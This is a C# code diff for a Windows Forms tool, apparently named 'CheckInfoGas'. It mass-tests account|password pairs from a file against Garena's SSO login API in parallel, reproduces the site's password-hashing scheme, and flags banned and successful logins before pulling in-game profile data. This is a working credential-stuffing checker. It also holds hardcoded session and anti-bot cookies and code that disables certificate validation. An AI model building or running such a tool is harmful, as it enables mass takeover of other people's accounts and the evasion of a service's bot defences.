@@ -4,7 +4,6 @@ using System.Collections.Generic;
 using System.Data;
 using System.IO;
 using System.Linq;
-using System.Net.Http;
 using System.Security.Cryptography;
 using System.Text;
 using System.Text.RegularExpressions;
@@ -17,11 +16,14 @@ namespace CheckInfoGas
 {
     public partial class Form1 : Form
     {
+        List<Task> tasks { get; set; }
+        string[] accounts { get; set; }
         public Form1(string permission)
         {
             this.Permission = permission;
             InitializeComponent();
             SetPermission();
+            tasks = new List<Task>();
         }
 
         CancellationTokenSource CancellationTokenSource;
@@ -83,107 +85,118 @@ namespace CheckInfoGas
 
         private async void Check(int maxThread)
         {
-            var tasks = new List<Task>();
-            var semaphore = new SemaphoreSlim(maxThread, maxThread);
-            var lines = await File.ReadAllLinesAsync(FilePath);
-            foreach (var line in lines)
+            await Task.Run(async () =>
             {
-                if (CancellationTokenSource.IsCancellationRequested)
-                    break;
-
-                if (string.IsNullOrEmpty(line))
-                    continue;
-
-                var dataRaw = line.Split('|');
-                if (dataRaw.Length < 2)
-                    continue;
-
-                var account = dataRaw[0].Trim();
-                var password = dataRaw[1].Trim();
-                int add = 0;
-                dgv.Invoke(new Action(() =>
+                var options = new ParallelOptions()
                 {
-                    add = dgv.Rows.Add((dgv.Rows.Count + 1), account, password);
-                }));
-                DataGridViewRow row = dgv.Rows[add];
-                await semaphore.WaitAsync();
-                tasks.Add(Task.Run(async () =>
+                    MaxDegreeOfParallelism = maxThread,
+                    CancellationToken = CancellationTokenSource.Token,
+                };
+
+                await Parallel.ForEachAsync(accounts, options, async (account, ct) =>
                 {
-                    try
+                    // Do Stuff here.
+                    if (ct.IsCancellationRequested)
+                        return;
+
+                    var dataRaw = account.Split('|');
+                    var acc = dataRaw[0].Trim();
+                    var password = dataRaw[1].Trim();
+
+                    // Use CancellationToken (ct) where appropriate.
+
+                    int add = 0;
+                    dgv.Invoke(new Action(() =>
                     {
-                        await CheckPerThread(row, account, password);
-                    }
-                    finally
-                    {
-                        semaphore.Release(); // Giải phóng phép Semaphore sau khi tác vụ hoàn thành
-                    }
-                }));
-                await Task.Delay(50);
-            }
-            await Task.WhenAll(tasks);
-            MessageBox.Show("Xong");
+                        add = dgv.Rows.Add(dgv.Rows.Count, acc, password, "Running");
+                    }));
+                    DataGridViewRow row = dgv.Rows[add];
+                    await CheckPerThread(row, acc, password);
+                });
+                //foreach (var line in accounts)
+                //{
+                //    if (CancellationTokenSource.IsCancellationRequested)
+                //        break;
+
+                //    var dataRaw = line.Split('|');
+
+                //    var account = dataRaw[0].Trim();
+                //    var password = dataRaw[1].Trim();
+
+                //    await semaphore.WaitAsync();
+                //    try
+                //    {
+                //        await CheckPerThread(account, password);
+                //    }
+                //    finally
+                //    {
+                //        semaphore.Release();
+                //    }
+                //}
+                MessageBox.Show("Xong");
+            });
+
+
         }
 
         private async Task CheckPerThread(DataGridViewRow row, string account, string password)
         {
-            await Task.Run(async () =>
+            bool isSuccess = false; int check = 3;
+            while (!isSuccess || check > 0)
             {
-                bool isSuccess = false;
-                while (!isSuccess)
+                try
                 {
-                    try
+                    var http = new HttpRequest
                     {
-                        SetStatusDataGridView(row, "Running");
-                        var http = new HttpRequest
-                        {
-                            Cookies = new CookieDictionary(),
-                        };
+                        Cookies = new CookieDictionary(),
+                    };
 
-                        var (v1, v2) = GetDataHashPassword(account);
+                    int i = 3; string v1 =string.Empty; string v2 = string.Empty;
+                    do
+                    {
+                        (v1, v2) = GetDataHashPassword(account);
+                        i--;
+                    } while (i > 0 || string.IsNullOrEmpty(v1) || string.IsNullOrEmpty(v2));
 
-                        if (string.IsNullOrEmpty(v1) || string.IsNullOrEmpty(v2))
-                        {
-                            int i = 3;
-                            while (i > 0 && string.IsNullOrEmpty(v1) && string.IsNullOrEmpty(v2))
-                            {
-                                (v1, v2) = GetDataHashPassword(account);
-                                i--;
-                            }
-                        }
+                    if (string.IsNullOrEmpty(v1) || string.IsNullOrEmpty(v2))
+                    {
+                        SetStatusDataGridView(row, "V1, v2 is null");
+                        break;
+                    }
 
-                        var headers = new Dictionary<string, string>
-                        {
-                            {"Accept", "application/json, text/plain, */*"},
-                            {"Accept-Language", "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"},
-                            {"Cookie", "_ga=GA1.1.1629491323.1706450848; token_session=c17e119c61460aab0b4a2024157a11b244f5430627c9566b0a8f702adb5f573a3edc9cb577dc1f4dbbe5f948e18d8c6e; _ga_1M7M9L6VPX=GS1.1.1708017064.12.1.1708017065.0.0.0; datadome=" + GetDataDome()},
-                            {"Sec-Fetch-Dest", "empty"},
-                            {"Sec-Fetch-Mode", "cors"},
-                            {"Sec-Fetch-Site", "same-origin"},
-                            {"sec-ch-ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\""},
-                            {"sec-ch-ua-mobile", "?1"},
-                            {"sec-ch-ua-platform", "\"Android\""},
-                            {"x-datadome-clientid", GetDataDome()}
-                        };
-                        foreach (var header in headers)
-                        {
-                            http.AddHeader(header.Key, header.Value);
-                        }
+                    //var headers = new Dictionary<string, string>
+                    //    {
+                    //        {"Accept", "application/json, text/plain, */*"},
+                    //        {"Accept-Language", "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"},
+                    //        {"Cookie", "_ga=GA1.1.1629491323.1706450848; token_session=c17e119c61460aab0b4a2024157a11b244f5430627c9566b0a8f702adb5f573a3edc9cb577dc1f4dbbe5f948e18d8c6e; _ga_1M7M9L6VPX=GS1.1.1708017064.12.1.1708017065.0.0.0; datadome=" + GetDataDome()},
+                    //        {"Sec-Fetch-Dest", "empty"},
+                    //        {"Sec-Fetch-Mode", "cors"},
+                    //        {"Sec-Fetch-Site", "same-origin"},
+                    //        {"sec-ch-ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\""},
+                    //        {"sec-ch-ua-mobile", "?1"},
+                    //        {"sec-ch-ua-platform", "\"Android\""},
+                    //        {"x-datadome-clientid", GetDataDome()}
+                    //    };
+                    //foreach (var header in headers)
+                    //{
+                    //    http.AddHeader(header.Key, header.Value);
+                    //}
 
-                        long id = DateTimeOffset.Now.ToUnixTimeMilliseconds() / 1000;
+                    string encryptedPass = MaHoaPassGarena(
+                        MD5Hash(password),
+                        SHA256Hash(SHA256Hash(MD5Hash(password) + v1) + v2)
+                    );
 
-                        string encryptedPass = MaHoaPassGarena(
-                            MD5Hash(password),
-                            SHA256Hash(SHA256Hash(MD5Hash(password) + v1) + v2)
-                        );
+                    long id = DateTimeOffset.Now.ToUnixTimeMilliseconds() / 1000;
 
-                        SetStatusDataGridView(row, "Get session");
-                        var httpResponse = http.Get($"https://sso.garena.com/api/login?account={account}&password={encryptedPass}&format=json&id={id}&app_id=10043");
+                    var response = http.Get($"https://sso.garena.com/api/login?account={account}&password={encryptedPass}&format=json&id={id}&app_id=10043").ToString();
 
-                        var response = httpResponse.ToString();
+                    await Task.Run(async () =>
+                    {
                         if (string.IsNullOrEmpty(response))
                         {
                             SetStatusDataGridView(row, "Không có data");
-                            break;
+                            return;
                         }
 
                         if (response.Contains("error_user_ban"))
@@ -206,6 +219,7 @@ namespace CheckInfoGas
                             if (dataObject.ContainsKey("session_key"))
                             {
                                 var sessionKey = dataObject["session_key"].ToString();
+
                                 SetStatusDataGridView(row, "Login Success");
                                 var status = string.Empty;
                                 var fileName = string.Empty;
@@ -217,6 +231,7 @@ namespace CheckInfoGas
                                     switch (infoStatus)
                                     {
                                         case "User info does not exist or is null":
+
                                             SetStatusDataGridView(row, infoStatus);
                                             break;
                                         case "Error_Mail":
@@ -233,7 +248,7 @@ namespace CheckInfoGas
                                     fileName = infoStatus;
 
                                     if (string.IsNullOrEmpty(status))
-                                        break;
+                                        return;
                                 }
 
                                 if (cbLQ.Checked)
@@ -286,15 +301,16 @@ namespace CheckInfoGas
                         {
                             SetStatusDataGridView(row, response);
                         }
+                    });
 
-                        isSuccess = true;
-                    }
-                    catch (Exception ex)
-                    {
-                        SetStatusDataGridView(row, ex.Message);
-                    }
+                    isSuccess = true;
                 }
-            });
+                catch (Exception ex)
+                {
+                    SetStatusDataGridView(row, ex.Message);
+                }
+                check--;
+            }
         }
 
         private void SetStatusDataGridView(DataGridViewRow row, string status)
@@ -332,9 +348,9 @@ namespace CheckInfoGas
                 Cookies = new CookieDictionary(),
                 SslCertificateValidatorCallback = (sender, cert, chain, sslPolicyErrors) => true,
             };
-            
+
             http.Cookies.Add("session_key", sessionKey);
-            
+
             var response = http.Post("https://pvp.garena.vn/api/summoner/profile/", "{}", "application/json").ToString();
             var hero = string.Empty;
             var responseObject = JObject.Parse(response);
@@ -637,12 +653,18 @@ namespace CheckInfoGas
 
         private string FilePath;
 
-        private void importToolStripMenuItem_Click(object sender, EventArgs e)
+        private async void importToolStripMenuItem_Click(object sender, EventArgs e)
         {
+            var semaphore = new SemaphoreSlim(10000, 10000);
+            var taskt = new List<Task>();
             OpenFileDialog openFileDialog = new OpenFileDialog();
             if (openFileDialog.ShowDialog() == DialogResult.OK)
             {
                 FilePath = openFileDialog.FileName;
+                var accounts2 = await File.ReadAllLinesAsync(FilePath);
+                accounts = accounts2.Where(x => !string.IsNullOrEmpty(x) && x.Split('|').Length > 2).ToArray();
+
+                MessageBox.Show("Load Xong");
             }
             else
             {
